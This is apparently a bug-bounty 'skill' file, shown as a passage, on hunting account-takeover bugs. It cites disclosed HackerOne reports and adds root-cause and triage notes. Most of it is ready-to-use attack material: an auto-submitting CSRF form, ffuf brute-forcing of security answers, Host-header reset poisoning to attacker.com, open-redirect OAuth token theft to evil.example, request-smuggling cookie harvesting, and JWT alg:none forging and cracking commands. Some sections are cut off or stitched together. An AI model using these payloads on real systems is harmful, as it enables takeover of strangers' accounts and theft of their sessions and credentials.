# prepare attacker state, iframe www.redditmedia.com, exploit window.name param passing

# OOB confirmation: code must actually arrive at your listener
# log the ?code= on your claimed host, exchange it for B's token
# decode errors as JSON — claims-challenge bodies may contain literal "access_token"
```

### CSRF-to-ATO PoC pattern (#419891, #2652603, #127703)
```html
<html><body>
<form action="https://target/member/updatesecurityquestions" method="POST">
  <input type="hidden" name="security_question_answer1" value="hacked" />
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="submit" />
</form>
<script>document.forms[0].submit();</script>
</body></html>
```
Grep for leaked nonces: `grep -roE "rt|csrf|state|url_stats" *.js` (#127703 found `rt` in a service worker). Check for non-changing nonces (`_idnonce`, #1090982) and cross-account token reuse (#308394).

### 2FA / OTP / passwordless / magic link
```bash
# 2FA linking IDOR + verify without credentials (#810880)
POST /api/2fa        {"id":"<victim-uuid>"}          # link 2FA to victim
POST /api/2fa/verify {"id":"<victim-uuid>","code":"123456"}  # login with code only

# Passwordless signup sets ANY user's password (#143717)
POST /rt/users/passwordless-signup
{"phoneNumberE164":"+victim","userWorkflow":"PASSWORDLESS_SIGNUP",
 "userRole":"client","state":"CREATE_NEW_PASSWORD",
 "newPasswordData":{"newPassword":"Pwned#2026"}}

# SMS session determinism (#1245762): /SessionCreate twice -> same token until verified
# Security-question brute with OSINT answers (#890196, #2652603)
ffuf -u "https://target/account/recover/answer" -X POST \
  -d '{"email":"victimB@x","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -fr "incorrect"
```

### Session / cookie / cache theft
```bash
# Cookie get/set gadget (#534450): GET /cookies returns any cookie value
# XSS -> login token (#735638): document.cookie || localStorage.getItem('Meteor.loginToken')
# Persistent cookie XSS -> login keylogger (#2010530): smuggled 'guvo' cookie + reflection

# Web Cache Deception (#1698316, #260697)
curl -s 'https://target/traveler/profile/edit/x.jpeg?triagethis' --compressed | grep -i 'HASESSION'
# victim visits the same URL; attacker fetches cached page with session

# Request smuggling mass cookie theft (#737140): smuggler CL.TE on short-link host,
# force GET https://<collaborator> with victim's 'd' cookie appended
```

### Response manipulation, CORS & pre-account
```bash
# Response manipulation (#1490470): intercept login response, {"status":false}->true
# #332632: change 400 Bad Request -> 200 OK for non-existent usernames/tokens

# CORS credential theft (#426147, #758785): send Origin: https://evil.example
# if ACAO reflects attacker origin AND ACAC: true -> fetch /api/me with credentials

# Pre-account signup (#1679734, #1074047, #1224008)
# register/attach your email to the unconfirmed victim identity, then let victim SSO in

# JWT expiry (#1760403): present an expired but otherwise valid signed token
# For alg:none / RS256->HS256 / kid injection, load hunt-jwt-crypto
```

### Provisioning, invitations & recovery abuse
```bash
# Invitation confirmation link with no email check (#915110)
# invite victim's existing email from your team, then open the confirmation link
# -> logged into victim's account directly, no credentials

# SCIM provisioning takeover (#3178999)
POST /scim/v2/Users
{"userName":"victimB","emails":[{"value":"attacker@evil.com","primary":true}]}
# -> victim's provisioned account bound to attacker-controlled identity

# Registration with the same email twice (#1224008, #273647, #785833)
POST /signup {"email":"victimB@x"}   # app allows duplicate email -> attacker claims identity

# Security-question recovery with OSINT answers (#890196, #2652603)
# challenge was md5(answer) in #890196 -> offline recovery of the answer
```

### Referer leak & CORS proof
```bash
# Reset page loads third-party resources -> token in Referer
GET /reset-password?token=SECRET
# page: <script src="https://analytics.example/t.js">
# outbound request carries Referer: https://target/reset-password?token=SECRET
# confirm with Collaborator as the off-origin host; mitigated by Referrer-Policy: no-referrer

# CORS credential theft (#426147, #758785)
curl -s -H "Origin: https://evil.example" https://target/api/me -i
# if ACAO: https://evil.example AND ACAC: true -> cross-origin read of B's data
```

### Step-up / password-change persistence
```bash
# No current-password gate on password change (#827484, #147203)
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE
{"new_password":"Pwned#2026"}      # no "current_password" field
# verify: log in as B with the new password from a clean browser
```

---

## Common Root Causes

1. **Identity state trusted from the request.** Email, user id, or redirect target is taken from user input and applied without server-side authorization. On IDOR email change (#915114, #950881), the `id` parameter decides whose email is rewritten; on #1695454, `application[id]` decides which object's secrets are printed. The fix is per-object authorization, not input filtering.
2. **Verification that never invalidates.** A password-reset or email-confirmation link stays valid after the email is changed or after first use (#685007, #1114347, #1250631). The attacker only needs the stale link plus continuing control of the old mailbox. Tokens must be single-use, short-lived, and bound to the current email/state.
3. **No re-authentication or step-up.** Email or password can be changed without the current password, OTP, or a confirm-link to the old address (#292673, #45084, #147203). This is the persistence multiplier: cookie theft plus a no-step-up password change equals durable takeover.
4. **Open redirect as an auth-token conduit.** `Location`/`redirectUrl`/`continue` is built from user input and reachable in the OAuth flow (#905607, #206591, #3723458, #1923672). A redirect that would be low severity on its own becomes Critical when it carries a `code` or `access_token`.
5. **Missing or leaked CSRF protection.** No token on state-changing requests, or the nonce is exposed in JS/JSON and reusable across accounts (#419891, #127703, #2652603, #1090982). GET-based link-account workflows are especially exposed (#423022).
6. **Trust in unverified identifiers.** Pending, unverified, invited, or unconfirmed accounts are accepted as real identities; no check that an email is confirmed (#1679734, #1074047, #671406, #1224008, #361194). "Unverified email" essentially means "anyone can claim this account first."
7. **Weak entropy and no throttling on codes.** Numeric OTPs and reset tokens can be brute-forced when unthrottled (#773519, #407971, #2748003, #827484, #332632). Time-based or MD5-of-timestamp tokens are predictable (#890196, #895650).
8. **Deterministic or identifier-only auth.** Session tokens are reused across OTP steps (#1245762), or a password/session is issued from a phone/email alone (#143717). Knowing an identifier is treated as proof of identity.
9. **Client-side auth decisions.** The server's answer is authoritative only in the browser: flip `status:false` to `true` or a `400` to `200` in Burp and the flow completes (#1490470, #332632, #1994227).
10. **Session data cached or reflected.** A session or CSRF token lands in a cacheable page or a reflected cookie/XSS sink (#1698316, #260697, #2010530, #735638, #534450). Missing `no-store`/`no-cache` and `HttpOnly` are the common enabling misconfigurations.
11. **Broken token or expiry validation.** A JWT's `exp` claim or signature is not verified, so an expired or forged token authenticates (#1760403). Token validation must be server-side and cryptographic.
12. **Implicit trust in linked-account callbacks.** Social-link endpoints accept attacker-controlled `code`/`state` without CSRF or origin checks (#127703, #423022, #121827, #129873). The `postMessage` origin check in #129873 used `search(t.origin)` — a substring match that accepted attacker origins.

### Root cause to canonical test

| Root cause | Canonical test | Positive result |
|---|---|---|
| Trusted object id | Swap `id` to B's id on email/password change | B's field changes from A's session |
| Stale token | Use old link after email change or after first use | Password reset succeeds |
| No step-up | Omit `current_password` / OTP field | Change persists after relog |
| Open redirect | Point `redirectUrl` at your listener | B's token lands on your host |
| Missing CSRF | Drop nonce; reuse nonce cross-account | One-click PoC changes B |
| Unverified identity | Sign up/invite with B's email, your data | B inherits your seeded state |
| Weak entropy | ffuf numeric codes | Fresh brute yields B session |
| Client-side decision | Flip `status`/status code in Burp | Flow completes server-side |
| Cached session | Append `.jpeg` to authenticated URL | Cached page returns session |

---

## Bypass Techniques

### Validation and filter bypasses
```
# Unescaped-dot regex in domain validation -> register lookalike domain (#3723458)
#   KA_DOMAIN_REGEX let a domain containing the allowed suffix pass -> transfer token stolen
# Null byte in OAuth state defeats CSRF check (#1046630):   state=<valid>%00
# Punycode/unicode normalization in email reset (#922559)
# Case variation in email/identifier (#419891 used casing=camel)
# Double-encoding of redirect (%252f) to survive one decode pass (#905607)
# Double-Host / X-Forwarded-* smuggling for reset-link building (#317476)
```
When a validation regex or domain allowlist rejects your first payload, read the validator from the JS bundle (as in #3723458) and look for unescaped dots, suffix-only matches, or `search()`-style substring checks. When a nonce is rejected, try appending `%00`, reusing it from a different response, or extracting it from a service worker.

### Token / state bypasses
```
# Reuse a reset token after email change (#685007); stale confirm link (#1114347)
# Add a second email to the JSON array -> same token to attacker (#1175081)
# Reuse CSRF nonce across accounts / extract from JS service worker (#127703, #1090982)
# Reset token exposed directly in the reset HTTP response (#173551, #2194928)
# Transfer auth token leaked via continued cross-subdomain redirect (#3723458)
# Guessable token = md5(timestamp) or sequential integer (#890196, #895650)
```
Token bypasses work when the server treats a token as a capability without binding it to a single recipient, a single use, a time window, or the current account state. Always test a token you legitimately obtained against a *different* account or a *later* state (#3324823).

### Auth-decision bypasses
```
# Flip JSON response {"status":false} -> true in Burp (#1490470)
# Change HTTP response 400 Bad Request -> 200 OK for invalid tokens (#332632)
# Skip email verification and log in with chosen credentials (#2699029, #1224008)
# response_type switch + leaking href -> steal Apple OAuth code (#1567186)
# OAuth CSRF by linking attacker's social account via GET workflow (#423022)
```
These bypasses succeed only when the client enforces the decision. Always re-send the modified flow from a clean browser and check whether the server actually persisted the privileged state (#1490470, #1994227).

### Chaining patterns
```
# CSRF -> change security question -> password reset -> full ATO (#2652603)
# Open redirect -> OAuth callback -> token to attacker listener (#905607)
# IDOR email change -> password reset -> login as victim (#915114, #950881)
# Request smuggling -> forced redirect with victim cookie -> Collaborator (#737140)
# Cookie XSS + cookie-parsing confusion -> persistent keylogger on login (#2010530)
# PII disclosure -> security-question answer -> reset (#2450685, #1483201)
# WebView universal XSS -> session token -> ATO (#1455987)
# Pre-account signup -> victim SSO -> inherit attacker-seeded state (#1679734)
```

### Bypass decision tree

1. **A domain allowlist rejects your `redirect_uri`?** Read the validator in the JS bundle. Try an unescaped-dot regex (#3723458), a suffix-only match, or a `search()`-style substring check (#129873). Then try a dangling subdomain of the allowed parent.
2. **A CSRF token is rejected?** Try null byte (`%00`) appended to `state` (#1046630), the same token from a different JSON response (#127703), or a non-changing nonce reused across accounts (#1090982).
3. **A reset link points to the right domain but is useless?** Check whether the token is in the response body (#173551), in a JSON array field (#1175081), or still valid after an email change (#685007).
4. **Login denies access?** Intercept the response and flip the boolean or status code (#1490470, #332632). If the server still denies, the decision is server-side — move on.
5. **Rate limit blocks brute?** Check a different endpoint that exposes the same secret — verification codes, admin APIs, password-current fields, or PII endpoints that leak the answer (#2450685, #407971).
6. **2FA blocks takeover?** Try linking 2FA to B via IDOR first (#810880), or a reset/backup-code flow that bypasses MFA (#281449).
7. **No token theft primitive?** Chain a cache deception or XSS sink to steal a session, then use a no-step-up password change to make it persistent (#1698316, #735638, #827484).

---

## Gate 0 Validation

Before writing the report, confirm all three. ATO is a destination class — primitives are not findings until they land on a second account.

1. **What can the attacker DO right now?**
   - Can you demonstrate actual takeover of **test account B** from attacker A's session/IP/device — e.g. a clean-browser login as B with a password you set, or an authenticated action as B?
   - For a token or code leak: did the token actually arrive at your controlled host/inbox (OOB confirmed), and did you exchange it for a usable session?
   - For a "no re-auth" change: did the state change persist server-side (relog to verify)?
   - For a behavior that needs the victim to click: did you confirm the victim's account — not just your own — changed?
   - "The email contains attacker.com" or "the response echoed my input" is not enough — read the real email and log in.

2. **What does the victim LOSE?**
   - Does B get locked out (password/email changed), or does the attacker gain B's data/privileges silently?
   - Is it one account or **mass** (sequential IDs, wildcard subdomain, cross-tenant)? Prove scale if claiming mass impact (#915114, #685338, #737140).
   - Is victim interaction zero/one-click, or does it require phishing, credentials, and CAPTCHA? This sets Critical versus Medium.
   - If only you are affected (self-ATO), it is not a valid finding (#745324 shows a "session disclosure" that was only the reporter's own session in the corpus).

3. **Can it be reproduced in 10 minutes from scratch?**
   - Fresh browser, attacker A and victim B accounts recreated, endpoint still live?
   - Does the token reliably land at your listener/inbox (not intermittent)?
   - Can a second person follow the steps and log in as B without prior knowledge?
   - For blind leaks, is the Collaborator hit tied to the exact parameter, with a negative control showing which parameter is inert?

### Worked Gate 0 evidence checklist

A report is ready only when every row below has a concrete artifact attached:

| Artifact | What to capture | Grounding example |
|---|---|---|
| Two-account setup | A's and B's credentials/inbox ownership | Every real ATO chain in the corpus |
| vulnerable request | Full raw request with the malicious parameter highlighted | `{"email":["victim","you"]}` (#1175081) |
| server-side state change | B's profile/email/password before and after | #915114, #950881 |
| token destination | Email body, listener log, or response body showing the token | #173551, #905607 |
| OOB confirmation | Collaborator hit tied to one parameter plus a negative control | #737140, blind leak paths |
| clean-browser proof | Login as B from a fresh session after the attack | #1046630, #810880 |
| victim lockout / data loss | Evidence B cannot reclaim the account or data was exposed | #538800, #2450685 |
| reproduction steps | 10-minute walkthrough a second person can follow | triage gate |

### False-positive killers
- A Host header appears in the email body but the actual link domain is server-pinned — **read the email**, do not infer from the reflected header.
- A `redirect_uri` merely reflects an off-origin value but the code is exchanged through a server-pinned backend — no token lands on your host.
- A reset token arrives in your inbox only because you requested it for your *own* account — that is normal behavior, not ATO.
- A rate limit is absent on `/forgot-password` but tokens are high-entropy and single-use — the impact is request flooding, not account takeover; routinely rejected.
- A CSRF PoC changes a field that does not affect identity (theme, display name) — not ATO.
- An `access_token` substring appears inside an OAuth claims-challenge error body — parse the JSON; it is not a usable token.

### Severity gate
- **Critical** — zero or low victim interaction: Host-header reset poisoning, IDOR email change to reset, JWT forgery to a victim endpoint, lax `redirect_uri` auth-code theft, request smuggling.
- **High** — one email click or a pre-existing session/cookie required: Referer leak, no-step-up password change behind cookie theft, one-click OAuth CSRF.
- **Medium** — requires phishing plus active user interaction: OAuth-link CSRF needing the victim to click while logged in.
- **Low / Invalid** — attacker must be MitM, or only self-account impact (e.g. cleartext reset email #173251 is MitM-dependent and lower on its own).

---

## Real Impact Examples

### Scenario A — Zero-click mass ATO via IDOR email change (CrowdSignal / Atavist pattern)
An authenticated attacker viewed "Edit user" at `/users/invite-user.php?id=<userid>` and changed the `id` to sequential victim IDs. Because the endpoint trusted the ID and skipped re-auth, clicking "Update Permissions" logged the attacker straight into the victim's account. The report notes user IDs are sequential with a simple range from `00010006` to `19920500+`, so a single script can walk the whole user base.

```
GET /users/invite-user.php?id=19920465&popup=1   # victim email in response
POST /users/update-user  id=19920465  email=attacker@evil.com
-> click "Update Permissions" -> logged in as victim
-> POST /forgot -> reset link to attacker mailbox -> set new password
```

The same primitive on `/cms/reader/account` (Atavist, #950881) let the attacker rewrite any user's email and then use `/forgot` to reset into the attacker's mailbox. Both are **account takeover with no user interaction**, and both scale across sequential IDs. Disclosed: #915114, #950881, #842625.

### Scenario B — Open redirect to OAuth token theft (cs.money / Periscope pattern)
The target exposed `https://cs.money///google.com` — an open redirect. Chaining it into the Steam OAuth login (`redirectUrl` and `callbackUrl` pointing at the redirect) made the victim's post-login token land on the attacker's `netlify.app` listener as `#?token=...`:

```
GET /login?redirectUrl=https://cs.money///evil.example%23
        &callbackUrl=https://cs.money///evil.example%23
-> victim logs in with Steam
-> lands on https://evil.example/#?token=Dlk9sGd8...  (attacker listener)
```

A related host-header variant (#317476) changed `Host: www.periscope.tv` to `Host: hackerone.com/www.periscope.tv`, so the OAuth redirect destination became the attacker-controlled domain and the authorize link, sent to the victim, delivered the account. These are one-click Critical ATOs. Disclosed: #905607, #317476, #206591, #3723458.

### Scenario C — Reset token that never dies (Imgur / Mattermost pattern)
A user requested a reset link, then changed their email after realizing the account might be compromised. The original link to the old address remained valid, so anyone still controlling the old mailbox could reset the password and take over the account. The report's steps are explicit: copy the reset link, change and verify a new email, then open the copied link and change the password. The mirror case (#1114347) let a wrong typed email keep an active confirmation link even after the user moved to an address they control.

```
1. request reset link -> copy it (do not open)
2. change account email -> verify new address
3. open copied reset link -> password changed  <-- ATO
```

The attacker needs only the stale link plus the old inbox — no interaction from the victim. Disclosed: #685007, #1114347, #1250631.

### Scenario D — Mass cookie theft via request smuggling (Slack pattern)
The researcher ran `smuggler` against `slackb.com`, found a CL.TE desync, and poisoned the backend socket so the next victim request became `GET https://<URL> HTTP/1.1` on `slackb.com`. The backend 301-redirected to `https://<URL>` with the victim's `d` session cookie attached, and a Collaborator listener harvested cookies at scale:

```
1) HTTP Request Smuggling CTLE -> Arbitrary Request Hijacking (poisoned socket)
2) Request Hijack forces victim requests to GET https://<URL> on slackb.com
3) Backend returns 301 to https://<URL> with slack cookies (the 'd' cookie)
4) Collaborator server captures victim cookies from the redirected request
```

This is the highest-impact session-theft ATO in the corpus. Disclosed: #737140 (also #740037).

### Scenario E — Pre-account seeding (Shopify Collabs / Bumble pattern)
A creator applied to a brand with their real email, but had not yet confirmed a Shopify ID. The attacker created a new Shopify ID and signed up at `collabs.shopify.com` using the **victim's email**, claiming the identity before the victim did. When the victim later tried to join with SSO, the weak verification did not detect that an account with the same email already existed, so the attacker-seeded state persisted. Similar logic hit Bumble/Badoo (#1074047) and Pornhub/YouPorn (#192648) through OAuth sign-up with an unverified matching email.

```
1. attacker signs up with victim's email (unverified account)
2. victim later signs in via OAuth/SSO
3. weak verification treats it as the same identity -> attacker retains access
```

No token interception is needed — the bug is that an unconfirmed identifier is treated as a real identity. Disclosed: #1679734, #1074047, #192648, #1224008, #361194.

### Scenario F — CSRF to security-question reset (DoD pattern)
The researcher found a CSRF flaw and escalated it to a full account takeover: a crafted page submitted a `POST /member/updatesecurityquestions` request in the victim's browser, replacing the victim's security answers with attacker-chosen values. The attacker then used the recovery flow to reset the password. The same pattern appears on profile/edit endpoints that allow email, username, and password changes without a CSRF token.

```html
<form action="https://target/member/updatesecurityquestions" method="POST">
  <input type="hidden" name="security_question_answer1" value="hacked" />
</form>
```

Because the victim only needs to visit the page while logged in, this is a one-click High; it becomes Critical when combined with a no-step-up reset. Disclosed: #2652603, #2699029, #2712857, #670924.

### Scenario G — Identifier-only password set (Uber passwordless pattern)
The `/rt/users/passwordless-signup` endpoint accepted a phone number plus a `state: CREATE_NEW_PASSWORD` flag and a `newPasswordData.newPassword` value. Supplying only a victim's phone number set a new password on that account, and the server replied `"New password has been created. Please login with the new Password."` Since phone numbers are enumerable, this is an arbitrary-account password change with no token and no victim interaction. The OSINT-style variant brute-forces short OTPs against login/SMS endpoints when throttling is absent (#159202 used a 4-digit OTP).

```
POST /rt/users/passwordless-signup
{"phoneNumberE164":"+victim","userWorkflow":"PASSWORDLESS_SIGNUP",
 "state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"..."}}
-> login as victim with the chosen password
```

Disclosed: #143717, #159202, #922418, #773519.

---

## Disclosed Report Citations

30 real, verified HackerOne reports. Every ID below appears in the study pack or the TOP Account Takeover list — no invented IDs or URLs.

1. **GitLab — Account Takeover via Password Reset without user interactions** ([H1 #2293343](https://hackerone.com/reports/2293343)) — password-reset poisoning, zero-interaction reset, bounty $35,000.
2. **HackerOne — Account takeover via leaked session cookie** ([H1 #745324](https://hackerone.com/reports/745324)) — session/cookie theft, session disclosure, 2019 / $20,000.
3. **Slack — Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** ([H1 #737140](https://hackerone.com/reports/737140)) — request-smuggling, CL.TE cookie theft, 2019 / no bounty.
4. **Flickr — Flickr Account Takeover using AWS Cognito API** ([H1 #1342088](https://hackerone.com/reports/1342088)) — OAuth/Cognito, access-token misuse, 2021 / no bounty.
5. **X / xAI — Bypassing Digits origin validation which leads to account takeover** ([H1 #129873](https://hackerone.com/reports/129873)) — SSO/postMessage origin validation, 2016 / no bounty.
6. **Reddit — One-click account hijack for anyone using Apple sign-in with Reddit** ([H1 #1567186](https://hackerone.com/reports/1567186)) — OAuth, response-type switch plus href/XSS, 2022 / Critical.
7. **Uber — Change any Uber user's password through /rt/users/passwordless-signup** ([H1 #143717](https://hackerone.com/reports/143717)) — passwordless signup, identifier-only password set, 2016 / no bounty.
8. **CS Money — [cs.money] Open Redirect Leads to Account Takeover** ([H1 #905607](https://hackerone.com/reports/905607)) — open redirect to OAuth token theft, double-encoding, 2020 / no bounty.
9. **X / xAI — Insufficient OAuth callback validation which leads to Periscope account takeover** ([H1 #110293](https://hackerone.com/reports/110293)) — OAuth, callback-locking bypass, 2016 / no bounty.
10. **Reverb.com — Full account takeover** ([H1 #314808](https://hackerone.com/reports/314808)) — OAuth/API, unvalidated facebook token, 2018 / no bounty.
11. **Superhuman (formerly Grammarly) — Ability to DOS any organization's SSO and open up the door to account takeovers** ([H1 #976603](https://hackerone.com/reports/976603)) — SSO, cross-org authentication, 2020 / $10,500.
12. **Automattic — IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal** ([H1 #915114](https://hackerone.com/reports/915114)) — IDOR, sequential user ID, 2020 / no bounty.
13. **UPchieve — Full account takeover of any user through reset password** ([H1 #1175081](https://hackerone.com/reports/1175081)) — reset, email-array mass assignment, 2021 / no bounty.
14. **Expedia Group Bug Bounty — Cache Deception Allows Account Takeover** ([H1 #1698316](https://hackerone.com/reports/1698316)) — cache deception, session disclosure, 2022 / no bounty.
15. **Discourse — Account takeover at try.discourse.org due to no CSRF protection in connecting Yahoo account** ([H1 #423022](https://hackerone.com/reports/423022)) — CSRF, account linking, 2018 / $512.
16. **Khan Academy — Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers** ([H1 #419891](https://hackerone.com/reports/419891)) — CSRF, `/signup/email` unconfirmed account, 2018 / no bounty.
17. **Khan Academy — Account takeover by changing email** ([H1 #538800](https://hackerone.com/reports/538800)) — CSRF/email change, unconfirmed account, 2019 / no bounty.
18. **Imgur — Password Reset Link not expiring after changing the email Leads To Account Takeover** ([H1 #685007](https://hackerone.com/reports/685007)) — reset, token no-expiry, 2019 / no bounty.
19. **Mattermost — Account takeover due to misconfiguration** ([H1 #1114347](https://hackerone.com/reports/1114347)) — email-change, stale confirmation link, 2021 / no bounty.
20. **Shopify — Account Takeover Vulnerability in Shopify Collabs Platform Due to Missing Email Verification** ([H1 #1679734](https://hackerone.com/reports/1679734)) — pre-account takeover, unverified email, 2022 / $800.
21. **Priceline — Account takeover via Google OneTap** ([H1 #671406](https://hackerone.com/reports/671406)) — SSO, unverified email login, 2019 / no bounty.
22. **Helium — Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify** ([H1 #810880](https://hackerone.com/reports/810880)) — 2FA-linking IDOR, verify without credentials, 2020 / $100.
23. **Logitech — One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter** ([H1 #1046630](https://hackerone.com/reports/1046630)) — OAuth CSRF, null-byte bypass, 2020 / $200.
24. **Zenly — Account Takeover via SMS Authentication Flow** ([H1 #1245762](https://hackerone.com/reports/1245762)) — session/OTP, deterministic session token, 2021 / no bounty.
25. **U.S. Dept Of Defense — CSRF Attack on changing security questions leads to full Account TakeOver** ([H1 #2652603](https://hackerone.com/reports/2652603)) — CSRF, security-question reset, 2024 / no bounty.
26. **Rocket.Chat — account takeover on 3.0.1 version** ([H1 #842625](https://hackerone.com/reports/842625)) — IDOR, reset hash in `/api/v1/users.info`, 2020 / no bounty.
27. **UPS VDP — Admin Authentication Bypass Lead to Admin Account Takeover** ([H1 #1490470](https://hackerone.com/reports/1490470)) — response manipulation, `status:false` to `true`, 2022 / no bounty.
28. **Uber — password reset token leaking allowed for ATO of an Uber account** ([H1 #173551](https://hackerone.com/reports/173551)) — reset, token in HTTP response, bounty $10,000.
29. **GitLab — Account takeover due to insufficient URL validation on RelayState parameter** ([H1 #1923672](https://hackerone.com/reports/1923672)) — SSO, open redirect via RelayState, bounty $2,450.
30. **lemlist — Unauthorized Password Reset Allows Account Takeover Across Tenant Boundaries** ([H1 #3378635](https://hackerone.com/reports/3378635)) — cross-tenant reset, tenant isolation bypass, no bounty.

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive needing no email control and no race. Chain: `PATCH /api/users/{victimB_uid}` with attacker-A session plus victim UID plus `{"email":"attacker@evil.com"}` to trigger reset, then receive the reset at the attacker mailbox for a full ATO with zero interaction (Critical). Grounding: #915114, #950881, #842625, #1695454.
- **`hunt-host-header`** — Canonical Path 1 primitive. Chain: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` so the mailer builds the link from the Host, the victim clicks, and the token leaks. Confirm via a Collaborator-hosted domain reading the real email, not the reflected header. Grounding: #317476, #1108874.
- **`hunt-oauth`** — `redirect_uri`/`state`/callback lives here. Chain: subdomain match on `*.target.com` plus a dangling CNAME, claim the host, serve a callback, have the victim click the crafted authorize URL so the code lands on the attacker subdomain, then exchange for a token. Always JSON-parse OAuth error bodies; never substring-match `access_token`. Grounding: #905607, #3723458, #1567186, #1923672.
- **`hunt-csrf`** — Account-link and profile-change CSRF are top ATO paths. Chain: no nonce on a connect-account endpoint plus the attacker's social account equals one-click ATO. Look for nonces leaked in JS/JSON (the `rt` pattern) and test null-byte state bypasses. Grounding: #127703, #423022, #2652603, #419891, #1046630.
- **`hunt-mfa-bypass`** — 2FA-linking IDOR and `/api/2fa/verify` without credentials; also SteamGuard brute. Grounding: #810880, #2492631, #407971.
- **`hunt-api-misconfig`** — JWT `exp`/signature validation, mass assignment on email arrays, REST object-ID abuse, and `/cookies`-style gadgets. Grounding: #1760403, #1175081, #1695454, #534450.
- **`hunt-subdomain`** — Wildcard acceptance at `redirect_uri` and dangling-CNAME discovery feed OAuth ATO; subdomain-takeover was the number-one signal (136 reports) in the corpus. Grounding: #3723458, #1434967.
- **`hunt-session` / `hunt-xss`** — Cookie theft via XSS/WebView/magic-link interception, then a no-step-up password change for persistence. Grounding: #735638, #1455987, #855618, #2010530.
- **`hunt-request-smuggling` / `hunt-cache-deception`** — Mass cookie theft and cacheable session disclosure. Grounding: #737140, #740037, #1698316, #260697.
- **`offensive-osint`** — Security-question answers (birth city, pet, first school) are often public; combine with unthrottled recovery for ATO with no brute force. Grounding: #2450685, #890196.
- **`triage-validation`** — Run the Gate 0 plus Severity gate: a fresh-browser 10-minute walkthrough taking over test account B separates Critical-paid from self-ATO rejections. Rate-limit-only reset reports are routinely rejected; prove token guessing instead.

### Chaining cookbook

| Starting primitive | Chain partner | Final ATO | Grounding |
|---|---|---|---|
| IDOR on user object | Password reset | Zero-click ATO | #915114, #950881 |
| Host-header injection | Reset mailer | Token theft via crafted link | #317476, #1108874 |
| Open redirect | OAuth callback | One-click token theft | #905607, #206591 |
| Dangling subdomain | `redirect_uri` wildcard | Code theft at claimed host | #3723458 |
| CSRF on link-account | Social login | One-click account merge | #127703, #423022 |
| XSS / cache deception | No-step-up password change | Persistent sessionless ATO | #735638, #1698316, #827484 |
| Request smuggling | Collaborator listener | Mass cookie harvest | #737140, #740037 |
| PII disclosure | Security-question recovery | Password reset | #2450685, #890196 |
| OTP / magic link | Identifier enumeration | Arbitrary account login | #143717, #855618 |
| 2FA-linking IDOR | `/api/2fa/verify` | Login without credentials | #810880 |

Load the chain partner skill *with* this one: ATO is rarely a single primitive, and the highest bounties in the corpus (#2293343 $35,000, #737140 mass ATO, #976603 $10,500) all come from joining two or three small flaws into a demonstrable takeover of a second account.


---

## Merged Source Knowledge

This section consolidates **20 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (28 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-ato/SKILL.md`

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap

# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"

# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key

# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT

# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
